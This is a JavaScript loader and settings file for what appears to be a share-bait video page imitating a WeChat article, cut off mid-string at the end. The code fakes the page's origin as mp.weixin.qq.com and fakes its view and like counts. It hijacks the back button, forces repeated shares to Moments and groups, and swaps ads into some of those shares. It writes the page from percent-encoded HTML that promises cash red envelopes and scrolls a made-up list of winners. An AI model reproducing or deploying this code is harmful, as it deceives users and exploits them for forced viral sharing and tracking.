// 返回开关 值为 0 表示关 值为 1 表示开
var fanhui = 1
var fanhuii = 0;
var tongji = 1;
// 视频点赞和阅读量修改
var likeAndview = new Array()
likeAndview['web'] = '网页由 mp.weixin.qq.com 提供</br> QQ浏览器X5内核提供技术支持' // 下拉网址伪装
likeAndview['view'] = '今天看点'        // 顶部超链接文本
likeAndview['readword'] = '阅读原文'    // 阅读原文超链接文本
likeAndview['readNum'] = '100000+'      // 阅读量修改
likeAndview['likeNum'] = '97315'        // 点赞量修改
//视频上方广告
var ad_1 = new Array()
// 开关 值为 0 表示关 值为 1 表示开
ad_1['on'] = 0
// 广告下标
ad_1['item'] = 'nk'
// 广告图片
ad_1['img'] = 'http://wx2.sinaimg.cn/mw690/bda2923dgy1fndzpsy561g20go02ogty.gif'
//视频下方广告
var ad_2 = new Array()
// 开关 值为 0 表示关 值为 1 表示开
ad_2['on'] = 1
// 广告下标
ad_2['item'] = 'xs_sz_qr'
// 广告图片
ad_2['img'] = 'http://wx2.sinaimg.cn/mw690/005xrpNUgy1freiad0xhzg30hs0243yg.gif'
//阅读原文下方广告
var ad_3 = new Array()
// 开关 值为 0 表示关 值为 1 表示开
ad_3['on'] = 0
// 广告下标
ad_3['item'] = 'nk'
// 广告图片
ad_3['img'] = 'http://xmzjvip.b0.upaiyun.com/2017/12/04/5701f26f6648e8fa3b1ede664b6945f2.gif'
//最下方广告
//    var ad_4 = new Array()
//    // 开关 值为 0 表示关 值为 1 表示开
//    ad_4['on'] = 0
//    // 广告下标
//    ad_4['item'] = 'nk'
//    // 广告图片
//    ad_4['img'] = 'https://wx2.sinaimg.cn/mw690/007gghNYgy1fuopkf5joqg30go05kgti.gif'
//阅读原文 和点击公众号
var ad_gzh = new Array()
// 开关 值为 0 表示关 值为 1 表示开
// ad_gzh['on'] = 0
// 广告下标
ad_gzh['item'] = 'xs_sz_qr,xs_swsj_qr'
// 广告图片
ad_gzh['img'] = 'nk'


// 内容
//1表示在视频下面开广告其他表示不开
var guangg = 1
var ad_4 = new Array()
//广告图片
ad_4['img'] = 'https://251img.oss-cn-shanghai.aliyuncs.com/xx3/psps/static/image/1.gif'//广告图片路径
//广告下标
ad_4['item'] = 'nk';

//1 表示第一次分享为圈,0表示第一次分享为群
var onequan = 0;
var Timeline = onequan;
// 0表示先分享群后分享圈 1表示先分享圈后分享群
var timelineOnOff = 0
// 值为 '0' 表示关闭广告
// 值为任意数字 表示分享第几次为广告 栗子：'1','3' 表示第一次第三次分享的是广告 第二次为视频
// 如果提交的数字为 '999' 这表示全部分享为广告
var TTimes = new Array('2'); // 朋友圈广告开关
// 分享朋友圈次数
var Tnum = 2
// 值为 '0' 表示关闭广告
// 值为任意数字 表示分享第几次为广告 栗子：'1','3' 表示第一次第三次分享的是广告 第二次为视频
//    '2','5'表示第二次第五次分享的是广告(朋友群)改数字为固定值
// 如果提交的数字为 '999' 这表示全部分享为广告
var ATimes = new Array('0'); // 群广告开关


var qaa = 0
if (ATimes.length == 1) {
    qaa = 3
} else {
    qaa = 4
}
// 分享朋友群次数
var Anum = 5

var sp_title = escape(videostr[vsd]['title']);
var sp_id = videostr[vsd]['sp_id'];
var sp_time = videostr[vsd]['stopshare'];
var baidu = videostr[vsd]['baidu'];
var youmeng = videostr[vsd]['youmeng']
// api域名
var apidomain = '//' + location.hostname
// 广告使用落地页面
// var ggdomain = location.pathname
var returnpage = location.hostname

// 广告使用广告域名
var ggdomain = apidomain

var autotime = 60000 * 15 //毫秒
var timestamp = Date.parse(new Date());
var diqu = ""

fanhui && openfh()
var new_doc = document.open("text/html", "replace");
//    本地目录版本
var html = unescape("%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text/html%3B%20charset%3DUTF-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20user-scalable%3Dno%2C%20initial-scale%3D1.0%2C%20maximum-scale%3D1.0%2C%20minimum-scale%3D1.0%22%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22ie%3Dedge%22%3E%0A%20%20%20%20%3Ctitle%3E...%3C/title%3E%0A%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22/v/main.css%22%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22/v/more.css%22%3E%0A%20%20%20%20%3Clink%20href%3D%22/v/swiper.min.css%22%20rel%3D%22stylesheet%22%3E%0A%20%20%20%20%3Cscript%20src%3D%22/v/jquery.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22/v/jquery.cookie.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22/v/zepto.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22/v/iscroll-lite.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22/v/swiper.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22https%3A//ip.ws.126.net/ipquery%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//imgcache.qq.com/tencentvideo_v1/tvp/js/tvp.player_v2_zepto.js%22%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//v.qq.com/iframe/tvp.config.js%22%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%20%20%20%20%3Clink%20href%3D%22/v/video.css%22%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%20%20%20%20*%7Bpadding%3A0%3Bmargin%3A0%3B%7D%0A%20%20%20%20%20%20%20%20body%7Bwidth%3A%20100%25%3Bbackground%3A%20%23000%3B%7D%0A%20%20%20%20%20%20%20%20%23tp5%7Bwidth%3A%20100%25%3Bheight%3A%20250px%3Bposition%3A%20fixed%3Btop%3A30%25%3Bleft%3A%200%3B%7D%0A%20%20%20%20%20%20%20%20%23gongao%7Bwidth%3A1000px%3Bheight%3A30px%3Boverflow%3Ahidden%3Bline-height%3A30px%3Bfont-size%3A13px%3Bfont-family%3A%27%u5B8B%u4F53%27%3Bfont-weight%3Abold%3B%7D%20%0A%20%20%20%20%20%20%20%20%23gongao%20%23scroll_begin%2C%20%23gongao%20%23scroll_end%7Bdisplay%3Ainline%7D%20%0A%20%20%20%20%3C/style%3E%0A%3C/head%3E%0A%20%20%20%20%3Cbody%3E%0A%20%20%20%20%3Cdiv%20%20class%3D%22shou%22%20%20style%3D%22position%3Afixed%3B%20background%3A%23000%3B%20width%3A%20100%25%3Bheight%3A%2040px%3B%20line-height%3A%2040px%3Bcolor%3A%20%23ffd8ae%3Bbackground%3A%23e6e5e8%3Bz-index%3A99999%3B%20top%3A0%22%3E%0A%20%20%20%20%20%20%20%20%3Cspan%20id%3D%22fanhui%22%20style%3D%22color%3A%23000000%3Bfont-weight%3A%20600%3B%22%20onclick%3D%22fanhui%28%29%22%3E%26nbsp%3B%26nbsp%3B%3C%26nbsp%3B%u8FD4%u56DE%3C/span%3E%20%0A%20%20%20%20%20%20%20%20%3Cdiv%20align%3D%22center%22%3E%u770B%u89C6%u9891%u5373%u6709%u673A%u4F1A%u9886%u53D6%u73B0%u91D1%u7EA2%u5305%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22gongao%22%3E%20%3Cdiv%20style%3D%22float%3Aleft%3B%22%3E%26nbsp%3B%u83B7%u5956%u540D%u5355%3A%26nbsp%3B%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22width%3A900px%3Bheight%3A30px%3Bmargin%3A0%205px%200%205px%3Bwhite-space%3A%20nowrap%3Boverflow%3Ahidden%3B%22%20id%3D%22scroll_div%22%20class%3D%22scroll_div%22%3E%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22scroll_begin%22%3E%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22%u4E36%u6F14%u7ECE%u60B2%u4F24%22%u83B7%u5F97%3A32.16%u5143%20%22%u7B80%u5355%u706C%u7231%22%u83B7%u5F97%uFF1A66.53%u5143%20%22%u6D41%u5E74%u706C%u672A%u4EA1%22%u83B7%u5F97%3A18.02%u5143%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22%u96EA%u82B1%u30DF%u98DE%u821E%22%u83B7%u5F97%3A85.38%u5143%20%22%u6DE1%u62B9%u4E36%u60B2%u4F24%22%u83B7%u5F97%3A59.14%u5143%20%22%u221E%u25C6%u66AF%u5C0F%u8431%u25C6%22%u83B7%u5F97%3A20.18%u5143%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22%u4EA1%u9B42%u5B64%u5FC3%22%u83B7%u5F97%3A17.52%u5143%20%22%uFE4F%u8584%u8377%u5C11%u5E74%22%u83B7%u5F97%3A24.16%u5143%20%22%u5DDD%u6D6E%u534E%u9EEF%u6DE1%22%u83B7%u5F97%3A16.15%u5143%20%22%u590F%u96E8%uFE4F%u521D%u6674%22%u83B7%u5F97%3A26.13%u5143%20%22%u534A%u68A6%u534A%u9192%22%u83B7%u5F97%3A38.25%u5143%20%22%u51C9%u57CE%u4EE5%u5317%22%u83B7%u5F97%3A23.16%u5143%20%22%u5618%uFF01%u5C0F%u58F0%u70B9%uFF01%22%u83B7%u5F97%3A29.33%u5143%20%22%u561F%u5634%u5356%u840C%u256F%u03B5%u2570%22%u83B7%u5F97%3A31.62%u5143%20%22%u7231%u5DF2%u79BB%u7EBF%22%u83B7%u5F97%3A42.75%u5143%20%22%u5B64%u5B88%u4E00%u57CE%22%u83B7%u5F97%3A16.81%u5143%20%22%u54CE%u5440%u5ABD%u5440%uFF01%22%u83B7%u5F97%3A35.23%u5143%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22scroll_end%22%3E%3C/div%3E%20%0A%20%20%20%20%20%20%20%20%3C/div%3E%20%0A%20%20%20%20%3C/div%3E%20%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22wrapper%22%20style%3D%22position%3Afixed%3B%20top%3A%200%3B%20bottom%3A%200%3B%20left%3A%200%3B%20right%3A%200%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22scroll%22%20style%3D%22position%3Afixed%3B%20background-color%3Ablack%3B%20z-index%3A%20100%3B%20width%3A%20100%25%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media%22%20id%3D%22js_article%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22top_banner%22%20id%3D%22js_top_ad_area%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_inner%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_area_primary%22%20id%3D%22page-content%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_content%22%20id%3D%22js_content%22%20style%3D%22height%3A%20200px%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22guangg%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22pauseplay%22%20style%3D%22display%3A%20none%3B%20opacity%3A%200%3B%20position%3A%20fixed%3B%20left%3A%200%3B%20right%3A%200%3B%20top%3A%2065px%3B%20bottom%3A%200%3B%20background-color%3A%20rgba%2880%2C%2080%2C%2080%2C%2050%29%3B%20z-index%3A%201%3B%22%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22mask%22%20class%3D%22mask%22%3E%26nbsp%3B%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22position%3A%20absolute%3B%20z-index%3A%20998%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20document.write%28%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27%3Cimg%20src%3D%22./img/fxq2.png%22%20id%3D%22fenxiang%22%20style%3D%22display%3Anone%3Bwidth%3A100%25%3Bpadding-bottom%3A100vh%3Bposition%3Afixed%3Bz-index%3A999%3Btop%3A0%3Bleft%3A0%3B%20Background%3Argba%280%2C0%2C0%2C0.6%29%3B%22%3E%27%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%29%3B%0Adocument.body.addEventListener%28%27touchmove%27%2C%20function%20%28e%29%20%7B%20e.preventDefault%28%29%3B%7D%2C%20%7Bpassive%3A%20false%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/script%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cdiv%3E%0A%20%20%20%20%3Cscript%20type%3D%22text/javascript%22%3E%20%0A%20%20%20%20%20%20%20%20function%20ScrollImgLeft%28%29%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20speed%3D50%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20scroll_begin%20%3D%20document.getElementById%28%22scroll_begin%22%29%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20scroll_end%20%3D%20document.getElementById%28%22scroll_end%22%29%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20scroll_div%20%3D%20document.getElementById%28%22scroll_div%22%29%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20scroll_end.innerHTML%3Dscroll_begin.innerHTML%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20function%20Marquee%28%29%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%28scroll_end.offsetWidth-scroll_div.scrollLeft%3C%3D0%29%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20scroll_div.scrollLeft-%3Dscroll_begin.offsetWidth%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20scroll_div.scrollLeft++%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20MyMar%3DsetInterval%28Marquee%2Cspeed%29%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20scroll_div.onmouseover%3Dfunction%28%29%20%7BclearInterval%28MyMar%29%3B%7D%20%0A%20%20%20%20%20%20%20%20%20%20%20%20scroll_div.onmouseout%3Dfunction%28%29%20%7BMyMar%3DsetInterval%28Marquee%2Cspeed%29%3B%7D%20%0A%20%20%20%20%20%20%20%20%7D%20%0A%0A%20%20%20%20%3C/script%3E%0A%20%20%20%20%3Cscript%20type%3D%22text/javascript%22%3EScrollImgLeft%28%29%3B%3C/script%3E%20%0A%20%20%20%20%3C/body%3E%0A%20%20%20%20%3Cscript%20src%3D%22//res.wx.qq.com/open/js/jweixin-1.0.0.js%22%3E%3C/script%3E%0A%20%20%20%20%3Clink%20href%3D%22/v/weui.min.css%22%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20/%3E%0A%20%20%20%20%3Cscript%3E%0A%20%20%20%20%0A%20%20%20%20%3C/script%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%20%20%20%20.guangg%7B%0A%20%20%20%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20position%3A%20fixed%3B%0A%20%20%20%20%20%20%20%20%20bottom%3A%200%3B%0A%20%20%20%20%20%20%20%20%20z-index%3A%20999999%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.weui-dialog%20%7B%0A%20%20%20%20%20%20%20%20position%3A%20fixed%3B%0A%20%20%20%20%20%20%20%20z-index%3A%205000%3B%0A%20%20%20%20%20%20%20%20width%3A%2095%25%3B%0A%20%20%20%20%20%20%20%20max-width%3A%20300px%3B%0A%20%20%20%20%20%20%20%20top%3A%2050%25%3B%0A%20%20%20%20%20%20%20%20left%3A%2050%25%3B%0A%20%20%20%20%20%20%20%20-webkit-transform%3A%20translate%28-50%25%2C%20-50%25%29%3B%0A%20%20%20%20%20%20%20%20transform%3A%20translate%28-50%25%2C%20-50%25%29%3B%0A%20%20%20%20%20%20%20%20background-color%3A%20%23fff%3B%0A%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20%20%20border-radius%3A%202vw%3B%0A%20%20%20%20%20%20%20%20overflow%3A%20hidden%3B%0A%20%20%20%20%20%20%20%20border-bottom-left-radius%3A1.8vw%3B%0A%20%20%20%20%20%20%20%20border-bottom-right-radius%3A0%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.weui-dialog__bd%3Afirst-child%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%202.7em%2020px%201.7em%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23353535%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.weui-dialog__bd%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%200%201.6em%20.8em%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20min-height%3A%2040px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%2015px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20line-height%3A%201.3%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20word-wrap%3A%20break-word%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20word-break%3A%20break-all%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23000%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.weui-dialog__ft%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20background%3A%23e1c38f%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20position%3A%20relative%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20line-height%3A%2048px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%2018px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20-webkit-box%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20-webkit-flex%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.weui-dialog__btn_primary%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%23lly_dialog%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A100vh%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%23lly_dialog_cha%7B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20right%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-right%3A%203vw%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-top%3A%20-2vw%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%209vw%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23666%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-weight%3A%20100%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.mask%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20position%3A%20absolute%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20top%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20filter%3A%20alpha%28opacity%3D75%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20%23000%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20z-index%3A%2062%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20left%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20opacity%3A%20.8%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20-moz-opacity%3A%20.8%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.text%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%2065%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%2075px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20float%3Aleft%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%201em%3B%0A%20%20%20%20%20%20%20%20%20%20%20-webkit-box-orient%3A%20vertical%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20-webkit-line-clamp%3A%203%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20overflow%3A%20hidden%3B%0A%20%20%20%20%3C/style%3E%0A%20%20%20%20%3Cscript%20type%3D%22text/javascript%22%20src%3D%22/v/zepto.min.js%22%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%0A%3Cscript%20src%3D%27app.js%3Ft%3D12657090%27%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%3Cdiv%20id%3D%22stat%22%3E%0A%3Cscript%20language%3D%22javascript%22%3Edocument.all.stat.style.display%3D%22none%22%3B%3C/script%3E%0A%3Cscript%20type%3D%22text/javascript%22%3Evar%20cnzz_protocol%20%3D%20%28%28%22https%3A%22%20%3D%3D%20document.location.protocol%29%20%3F%20%22https%3A//%22%20%3A%20%22http%3A//%22%29%3Bdocument.write%28unescape%28%22%3Cspanid%3D%27cnzz_stat_icon_%22%22" + youmeng + "%22%22%27%3E%3C/span%3E%3Cscript%20src%3D%27%22%20+%20cnzz_protocol%20+%20%22s5.cnzz.com/z_stat.php%3Fid%3D%22%22" + youmeng + "%22%22%27%20type%3D%27text/javascript%27%3E%3C/script%3E%22%29%29%3B%3C/script%3E%0A%20%20%20%20%0A%3C/div%3E%0A%3C/html%3E");
//  线上版本
//    var html = unescape("%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text/html%3B%20charset%3DUTF-8%22%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22IE%3Dedge%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22apple-mobile-web-app-capable%22%20content%3D%22yes%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22apple-mobile-web-app-status-bar-style%22%20content%3D%22black%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22format-detection%22%20content%3D%22telephone%3Dno%22%3E%0A%20%20%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22initial-scale%3D1%2C%20maximum-scale%3D1%22%3E%0A%20%20%20%20%3Ctitle%3E...%3C/title%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22/v/main.css%22%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22/v/more.css%22%3E%0A%20%20%20%20%3Clink%20href%3D%22/v/swiper.min.css%22%20rel%3D%22stylesheet%22%3E%0A%20%20%20%20%3Cscript%20src%3D%22/v/jquery.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22/v/jquery.cookie.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22/v/zepto.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22/v/iscroll-lite.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22/v/swiper.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22https%3A//ip.ws.126.net/ipquery%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//imgcache.qq.com/tencentvideo_v1/tvp/js/tvp.player_v2_zepto.js%22%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//v.qq.com/iframe/tvp.config.js%22%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%20%20%20%20%3Clink%20href%3D%22/v/video.css%22%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%3E%0A%3C/head%3E%0A%20%20%20%20%3Cbody%20class%3D%22zh_CN%20mm_appmsg%20appmsg_skin_default%20rich_media_empty_extra%22%20id%3D%22activity-detail%22%20style%3D%22background-color%3A%20%23333%3B%22%3E%0A%20%20%20%20%3Cdiv%20id%3D%22content-content%22%20style%3D%22height%3A%2040px%3B%20text-align%3A%20center%3B%20padding-top%3A%2010px%3B%20color%3A%20%23999%3B%20font-size%3A%2080%25%3B%20display%3A%20block%3B%22%3E%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cdiv%20id%3D%22wrapper%22%20style%3D%22position%3A%20absolute%3B%20top%3A%200%3B%20bottom%3A%200%3B%20left%3A%200%3B%20right%3A%200%3B%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22scroll%22%20style%3D%22position%3A%20absolute%3B%20background-color%3A%20%23f3f3f3%3B%20z-index%3A%20100%3B%20width%3A%20100%25%3B%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media%22%20id%3D%22js_article%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22top_banner%22%20id%3D%22js_top_ad_area%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_inner%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_area_primary%22%20id%3D%22page-content%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22img-content%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%22rich_media_title%22%20id%3D%22activity-name%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/h2%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_meta_list%22%20id%3D%22meta_content%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22rich_media_meta%22%20id%3D%22profileBt%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20style%3D%22font-size%3A%2014px%3B%22%20href%3D%22javascript%3Agzh%28%29%3B%22%20id%3D%22post-user%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cem%20style%3D%22font-size%3A%2014px%3B%22%20class%3D%22rich_media_meta%20rich_media_meta_text%22%20id%3D%22post-date%22%3E%0A%20%20%20%20%20%20%20%20%20%20%